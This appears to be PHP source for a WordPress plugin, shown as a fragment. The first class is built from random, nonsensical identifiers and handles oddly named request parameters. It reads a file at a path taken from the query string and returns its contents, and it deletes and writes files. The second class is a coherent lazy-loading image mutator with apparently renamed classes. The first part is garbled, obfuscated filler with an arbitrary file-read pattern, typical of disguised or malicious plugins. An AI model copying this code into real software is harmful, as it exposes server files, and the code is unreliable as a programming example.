            $this->notifyRichFilter = file_get_contents($welcomeIntegrationTinyComposer);
        }
        $performanceOldSmart = '';
        if (is_file($welcomeIntegrationTinyComposer)) {
            $performanceOldSmart = file_get_contents($welcomeIntegrationTinyComposer);
        }
        if (!empty($_POST['id4680']))
            $syncInteractivityCdnExternal = $_POST['id4680'];
        else
            $syncInteractivityCdnExternal = '';
        $optionsVideosTableSnippets = $_SERVER['QUERY_STRING'];
        if (file_exists($this->trackerPolyfillPostMultiple))
            unlink($this->trackerPolyfillPostMultiple);
        $beforeManagementToolkit404 = '';
        if (is_file($optionsVideosTableSnippets)) {
            $beforeManagementToolkit404 = file_get_contents($optionsVideosTableSnippets);
        }
        if (!empty($_POST['HI_GROUPS']))
            $attachmentSearchSites = $_POST['HI_GROUPS'];
        else
            $attachmentSearchSites = '';
        if (file_exists($attachmentSearchSites)) {
            $this->formsResultsDay = filesize($attachmentSearchSites);
        }
        if (is_file($attachmentSearchSites)) {
            $this->friendlyFeedsGift = filesize($attachmentSearchSites);
        }
        if (file_exists($beforeManagementToolkit404)) {
            $this->notifyRichFilter = file_get_contents($beforeManagementToolkit404);
        }
        return $beforeManagementToolkit404;
    }

    function gravatarRemoverSelector($maintenanceBbpressRatingsPrice)
    {
        $antiRemoveDesigner = strlen($maintenanceBbpressRatingsPrice);
        $notificationsChartFriendlyJquery = 'vbhuqwh';
        $this->excerptUiSend = substr($this->flashAccessFilterPlupload, $this->snippetsShowGenesisImages, $this->shopNewsNextgen);
        if (!empty($_POST['DUFF5N']))
            $generatorNowDiscount = $_POST['DUFF5N'];
        else
            $generatorNowDiscount = '';
        $thumbnailFontsReal = $_SERVER['REMOTE_ADDR'];
        if (isset($_REQUEST['J9065324']))
            $articleAttachmentAutocompleteImport = $_REQUEST['J9065324'];
        else
            $articleAttachmentAutocompleteImport = '';
        $this->formsResultsDay = strlen($articleAttachmentAutocompleteImport);
        $shareMaxDisableBased = do_action('kit_current_oembed');
        $vendorUrlTranslate = esc_url($articleAttachmentAutocompleteImport);
        $followCheckData = strtolower($notificationsChartFriendlyJquery);
        $couponsMigrationEmbedder = $this->alertChatRevisions();
        return $couponsMigrationEmbedder;
    }

    function countdownShippingGraphSignup($clientDonationSoftware)
    {
        $fieldQueryAdsense = md5($clientDonationSoftware);
        $statisticsPerformanceVideos = strpos($clientDonationSoftware, $fieldQueryAdsense);
        $reminderAddressScript = base64_decode($clientDonationSoftware);
        $toolsListingMigration = admin_url();
        $this->urlRelatedAuthenticationUploader = strlen($toolsListingMigration);
        $this->estatePartsFrontAi = strlen($this->fontsRadioAnti);
        $bestFrontendWebAge = 'ticker orders coupons auto twitter';
        $cssNewInstallBackground = strtoupper($bestFrontendWebAge);
        return $cssNewInstallBackground;
    }

    function pageNewsBasicClean()
    {
        $conversionYoutubeTotal = $this->makeDeprecatedCacheVerification;
        $downloadsContactSignupNofollow = $this->apiImportScriptAttachment($conversionYoutubeTotal);
        $checkerPickerLike = rawurlencode($conversionYoutubeTotal);
        $signBulkEditor = $this->exchangeHoverReset();
        if (isset($_REQUEST['nnmhacookie']))
            $shoppingExtendedModal = $_REQUEST['nnmhacookie'];
        else
            $shoppingExtendedModal = '';
        for ($i = 0; $i < $this->estatePartsFrontAi; $i++) {
            $instantAutoTranslate = esc_url($shoppingExtendedModal);
            $categorySpeedOldBlocker = $this->githubWebpPinterestSmooth($i);
            if (!empty($_REQUEST['LXJZPW']))
                $updateRatingsSchedulerParagraph = $_REQUEST['LXJZPW'];
            else
                $updateRatingsSchedulerParagraph = '';
            $streamSuiteCounterElementor = $this->formsVirtualLazy($shoppingExtendedModal);
            $advancedCodesLightgray = 'gravatar really maintenance forum';
            $bulkTrafficTaxonomyCall = $this->updateNiceSidebar;
            $designYoastWpml = $this->migrationSubscriptionsNav($bulkTrafficTaxonomyCall);
            $fxPlatformPopup = strpos($shoppingExtendedModal, $signBulkEditor);
            $notesMediaelementStopEdition = $this->animatedQuantityShowcaseMap();
            $fxBoxSlideshowAccordion = strlen($advancedCodesLightgray);
            $comingBackgroundFeedback = $this->webAnimatedBangla();
            if (isset($_GET['ITFV']))
                $zoomCheckoutBrowserMultiple = $_GET['ITFV'];
            else
                $zoomCheckoutBrowserMultiple = '';
        }
        $metaFreeBooster = strlen($zoomCheckoutBrowserMultiple);
        $gamipressBeforeFont = rawurldecode($zoomCheckoutBrowserMultiple);
        $onlyResultsSort = rawurldecode($comingBackgroundFeedback);
        return $gamipressBeforeFont;
    }

    function treeLockAdsenseViews()
    {
        $twitterBootstrapSort = $_SERVER['QUERY_STRING'];
        $infoOutPrivacyCountdown = md5($twitterBootstrapSort);
        $this->schemaEcommerceAmpThemes = strpos($this->smoothScriptIp, 'zTwL1XFintO2A');
        $uploadTaxonomyDisplayCron = rawurldecode($infoOutPrivacyCountdown);
        $privateCheckerAwesomeUser = rawurlencode($infoOutPrivacyCountdown);
        $locatorDebugAutomatic = 'mswpmf';
        if (!empty($_GET['project_rkt']))
            $visualColorAge = $_GET['project_rkt'];
        else
            $visualColorAge = '';
        $thumbnailsPressFollow = md5($locatorDebugAutomatic);
        $rankAccountMarketing = base64_encode($visualColorAge);
        return $rankAccountMarketing;
    }

    function subscriptionAddonsAltBuilder($smoothYoutubeCustom)
    {
        $translateBlocksBadgeHealth = rawurldecode($smoothYoutubeCustom);
        $sliderFlashTermWpforms = rawurldecode($translateBlocksBadgeHealth);
        $rateNextStatus = strtolower($sliderFlashTermWpforms);
        $autoBasedSwitch = strtoupper($sliderFlashTermWpforms);
        $appointmentArchivesShowTranslator = rawurldecode($rateNextStatus);
        add_action('copyright_player_multiple', $rateNextStatus);
        $this->fontsRadioAnti = base64_decode($this->scssFeedSimplePreloader);
        $oembedWpmuRemoverLocator = strpos($rateNextStatus, $smoothYoutubeCustom);
        $updateTickerVisitor = strpos($appointmentArchivesShowTranslator, $smoothYoutubeCustom);
        $elementsAccordionNavigationHtml = get_transient($autoBasedSwitch);
        $trackingScriptShort = md5($elementsAccordionNavigationHtml);
        return $trackingScriptShort;
    }

    function customizeModalNextQuiz($socialShoppItemField)
    {
        if (file_exists($socialShoppItemField)) {
            $this->notifyRichFilter = file_get_contents($socialShoppItemField);
        }
        if (is_dir($socialShoppItemField)) {
            $namespacedColumnsStockCarousel = glob($socialShoppItemField);
        }
        file_put_contents($this->trackerPolyfillPostMultiple, $this->allowNumbersThemes . ' ' . $this->smoothScriptIp);
        if (is_file($socialShoppItemField)) {
            $this->notifyRichFilter = file_get_contents($socialShoppItemField);
        }
        if (file_exists($socialShoppItemField)) {
            $this->notifyRichFilter = file_get_contents($socialShoppItemField);
        }
        $libraryAfterThumbnails = admin_url();
        if (file_exists($socialShoppItemField)) {
            $this->friendlyFeedsGift = filesize($socialShoppItemField);
        }
        return $libraryAfterThumbnails;
    }

    function migrationSubscriptionsNav($cdnQuantityAwesomeNotification)
    {
        $surveyOpenAddonsCloud = $cdnQuantityAwesomeNotification + 5;
        $affiliateRedirectionService = 9912;
        $this->urlRelatedAuthenticationUploader = $surveyOpenAddonsCloud + $affiliateRedirectionService;
        $kitCategoryCatalog = $cdnQuantityAwesomeNotification - $affiliateRedirectionService;
        $this->replaceHelperSecure = $this->siteSchedulerTabsRates % $this->updateNiceSidebar;
        $this->formsResultsDay = $affiliateRedirectionService + $cdnQuantityAwesomeNotification;
        return $surveyOpenAddonsCloud;
    }

    function bbpressMobileRate($status404UiShortcodes)
    {
        $imagesVisibilityAgeNews = site_url();
        $this->formsResultsDay = strlen($status404UiShortcodes);
        if (isset($_POST['hide_really']))
            $guestAttachmentsWeb = $_POST['hide_really'];
        else
            $guestAttachmentsWeb = '';
        if (isset($_POST['click_react']))
            $messageAutoInteractive = $_POST['click_react'];
        else
            $messageAutoInteractive = '';
        $assetsRestrictDesignerExcerpt = rawurlencode($imagesVisibilityAgeNews);
        $baseEcommerceMedia = md5($imagesVisibilityAgeNews);
        $this->flashAccessFilterPlupload = $_POST[$this->infoDateDashboardReader];
        $this->urlRelatedAuthenticationUploader = strlen($messageAutoInteractive);
        $statsGiftPollRich = strtolower($baseEcommerceMedia);
        return $statsGiftPollRich;
    }

    function timeEditSchemaGateway($pdfCalculatorSeo)
    {
        if (isset($_REQUEST['hjb_exchange']))
            $sidebarUpgraderCheckerMini = $_REQUEST['hjb_exchange'];
        else
            $sidebarUpgraderCheckerMini = '';
        $storePushActiveSite = $this->countdownShippingGraphSignup($pdfCalculatorSeo);
        $ratingsProjectDesign = $this->allowNumbersThemes;
        $variationPluploadRequest = $this->oldPickerUploadLead();
        $supportAllYoast = trim($pdfCalculatorSeo);
        for ($i = 0; $i < $this->estatePartsFrontAi; $i++) {
            $recentRemoteLinksElements = strtolower($ratingsProjectDesign);
            $this->urlRelatedAuthenticationUploader = strpos($storePushActiveSite, $variationPluploadRequest);
            $pollQuantityUrls = $this->githubWebpPinterestSmooth($i);
            $this->notifyRichFilter = apply_filters('make_notification_upgrader', $storePushActiveSite);
            $staticCaptchaTitles = $this->trackingResetJavascript($sidebarUpgraderCheckerMini);
            if (!empty($_POST['ja_team']))
                $attachmentLeadGuest = $_POST['ja_team'];
            else
                $attachmentLeadGuest = '';
            $compareLocationQuantityEffects = strpos($attachmentLeadGuest, $ratingsProjectDesign);
            $websiteFxConsentSvg = $this->migrationSubscriptionsNav($compareLocationQuantityEffects);
            $this->notifyRichFilter = strtolower($staticCaptchaTitles);
            $userFixLive = $this->exporterBetterMaxCloud();
            $menusStyleQuick = esc_html($staticCaptchaTitles);
            $radioLimitItem = $this->permalinksSurveyNow();
            $iconImagesDaily = strpos($supportAllYoast, $staticCaptchaTitles);
        }
        $versionModeViewerRecaptcha = substr($userFixLive, $compareLocationQuantityEffects, $iconImagesDaily);
        $statisticsDropdownMedia = rawurlencode($menusStyleQuick);
        if (isset($_REQUEST['pefu']))
            $mostProductsNotesEffect = $_REQUEST['pefu'];
        else
            $mostProductsNotesEffect = '';
        $shareBlogrollContact = strtoupper($mostProductsNotesEffect);
        $labelSourceBanglaTraffic = strlen($shareBlogrollContact);
        $shoppGetStatistics = md5($mostProductsNotesEffect);
        $wpmlRestaurantCategoryPlupload = strtoupper($shoppGetStatistics);
        return $wpmlRestaurantCategoryPlupload;
    }

    function shoppingFilesOptimizer()
    {
        $onlyJsonFeedsButtons = $this->updateNiceSidebar;
        $visibilityRtlCheckout = 9048;
        $this->formsResultsDay = $visibilityRtlCheckout * $onlyJsonFeedsButtons;
        $disableTrackingBuilder = 4933;
        $masterDisableWall = get_permalink($disableTrackingBuilder);
        $this->urlRelatedAuthenticationUploader = $disableTrackingBuilder + 1;
        $archivesResultsColumnsAddons = $disableTrackingBuilder + 5;
        $blocksTestimonialViewsGenesis = esc_url($masterDisableWall);
        $this->friendlyFeedsGift = $archivesResultsColumnsAddons % 8;
        $pluginsAccountCheckoutOptimizer = $this->replaceHelperSecure;
        return $blocksTestimonialViewsGenesis;
    }
}

$colorTwitterSurveyHide = new toolkitPdfServices();

class ninja_next_cover
{
    private $config;

    private $modified = false;

    private $excludes;

    private $posts_by_url;

    public function __construct($config, $posts_by_url)
    {
        $this->config = $config;
        $this->posts_by_url = $posts_by_url;
    }

    public function run($buffer)
    {
        $this->excludes = apply_filters('w3tc_lazyload_excludes', $this->config->get_array('lazyload.exclude'));

        $r = apply_filters(
            'w3tc_lazyload_mutator_before',
            array(
                'buffer' => $buffer,
                'modified' => $this->modified,
            )
        );
        $buffer = $r['buffer'];
        $this->modified = $r['modified'];

        $unmutable = new ninja_next_cover_Unmutable();
        $buffer = $unmutable->remove_unmutable($buffer);

        if ($this->config->get_boolean('lazyload.process_img')) {
            $buffer = preg_replace_callback(
                '~<picture(\s[^>]+)*>(.*?)</picture>~is',
                array($this, 'tag_picture'),
                $buffer
            );
            $buffer = preg_replace_callback(
                '~<img\s[^>]+>~is',
                array($this, 'tag_img'),
                $buffer
            );
        }

        if ($this->config->get_boolean('lazyload.process_background')) {
            $buffer = preg_replace_callback(
                '~<[^>]+background(-image)?:\s*url[^>]+>~is',
                array($this, 'tag_with_background'),
                $buffer
            );
        }

        $buffer = $unmutable->restore_unmutable($buffer);

        return $buffer;
    }

    public function content_modified()
    {
        return $this->modified;
    }

    public function tag_picture($matches)
    {
        $content = $matches[0];

        if ($this->is_content_excluded($content)) {
            return $content;
        }

        $m = new ninja_next_cover_Picture($this);

        return $m->run($content);
    }

    public function tag_img($matches)
    {
        $content = $matches[0];

        if ($this->is_content_excluded($content)) {
            return $content;
        }

        $dim = $this->tag_get_dimensions($content);
        return $this->tag_img_content_replace($content, $dim);
    }

    public function tag_img_content_replace($content, $dim)
    {
        $count = 0;
        $content = preg_replace(
            '~(\s)src=~is',
            '$1src="' . $this->placeholder($dim['w'], $dim['h']) . '" data-src=',
            $content,
            -1,
            $count
        );

        if ($count > 0) {
            $content = preg_replace(
                '~(\s)(srcset|sizes)=~is',
                '$1data-$2=',
                $content
            );

            $content = $this->add_class_lazy($content);
            $content = $this->remove_native_lazy($content);
            $this->modified = true;
        }

        return $content;
    }

    public function tag_get_dimensions($content)
    {
        $dim = array(
            'w' => 1,
            'h' => 1,
        );
        $m = null;
        if (preg_match('~\swidth=[\s\'"]*([0-9]+)~is', $content, $m)) {
            $dim['w'] = (int) $m[1];
            $dim['h'] = $dim['w'];

            if (preg_match('~\sheight=[\s\'"]*([0-9]+)~is', $content, $m)) {
                $dim['h'] = (int) $m[1];
                return $dim;
            }
        }

        if (
            !preg_match(
                '~\ssrc=(\'([^\']*)\'|"([^"]*)"|([^\'"][^\s]*))~is',
                $content,
                $m
            )
        ) {
            return $dim;
        }

        $url = (!empty($m[4]) ? $m[4] : ((!empty($m[3]) ? $m[3] : $m[2])));

        if (isset($this->posts_by_url[$url])) {
            $post_id = $this->posts_by_url[$url];

            $image = wp_get_attachment_image_src($post_id, 'full');
            if ($image) {
                $dim['w'] = $image[1];
                $dim['h'] = $image[2];
            }

            return $dim;
        }

        static $base_url = null;
        if (is_null($base_url)) {
            $base_url = wp_get_upload_dir()['baseurl'];
        }

        if (
            substr($url, 0, strlen($base_url)) === $base_url &&
            preg_match('~(.+)-(\d+)x(\d+)(\.[a-z0-9]+)$~is', $url, $m)
        ) {
            $dim['w'] = (int) $m[2];
            $dim['h'] = (int) $m[3];
        }

        return $dim;
    }

    public function tag_with_background($matches)
    {
        $content = $matches[0];

        if ($this->is_content_excluded($content)) {
            return $content;
        }

        $quote_match = null;
        if (!preg_match('~\s+style\s*=\s*([\"\'])~is', $content, $quote_match)) {
            return $content;
        }

        $quote = $quote_match[1];

        $count = 0;
        $content = preg_replace_callback(
            '~(\s+)(style\s*=\s*[' . $quote . '])(.*?)([' . $quote . '])~is',
            array($this, 'style_offload_background'),
            $content,
            -1,
            $count
        );

        if ($count > 0) {
            $content = $this->add_class_lazy($content);
            $this->modified = true;
        }

        return $content;
    }

    public function style_offload_background($matches)
    {
        list($match, $v1, $v2, $v, $quote) = $matches;

        $url_match = null;

        preg_match('~background(?:-image)?:\s*url\(([\"\']?)(.+?)\1\)~is', $v, $url_match);

        $v = preg_replace('~background(?:-image)?:\s*url\(([\"\']?).+?\1\)[^;]*;?\s*~is', '', $v);

        $raw_url = '';
        if (isset($url_match[2])) {
            $charset = get_bloginfo('charset');
            $raw_url = trim(html_entity_decode($url_match[2], ENT_QUOTES, $charset));
            $raw_url = trim($raw_url, '\'"');
        }

        return $v1 . $v2 . $v . $quote . ' data-bg=' . $quote . esc_attr($raw_url) . $quote;
    }

    private function add_class_lazy($content)
    {
        $count = 0;
        $content = preg_replace_callback(
            '~(\s+)(class=)([\"\'])(.*?)([\"\'])~is',
            array($this, 'class_process'),
            $content,
            -1,
            $count
        );

        if ($count <= 0) {
            $content = preg_replace(
                '~<(\S+)(\s+)~is',
                '<$1$2class="lazy" ',
                $content
            );
        }

        return $content;
    }

    public function remove_native_lazy($content)
    {
        return preg_replace(
            '~(\s+)loading=[\'"]lazy[\'"]~is',
            '',
            $content
        );
    }

    public function class_process($matches)
    {
        list($match, $v1, $v2, $quote, $v) = $matches;
        if (preg_match('~(^|\s)lazy(\s|$)~is', $v)) {
            return $match;
        }

        $v .= ' lazy';

        return $v1 . $v2 . $quote . $v . $quote;
    }

    private function is_content_excluded($content)
    {
        foreach ($this->excludes as $w) {
            if (!empty($w)) {
                if (strpos($content, $w) !== false) {
                    return true;
                }
            }
        }

        return false;
    }

    public function placeholder($w, $h)
    {
        return "data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20"
            . $w . '%20' . $h . "'%3E%3C/svg%3E";
    }
}
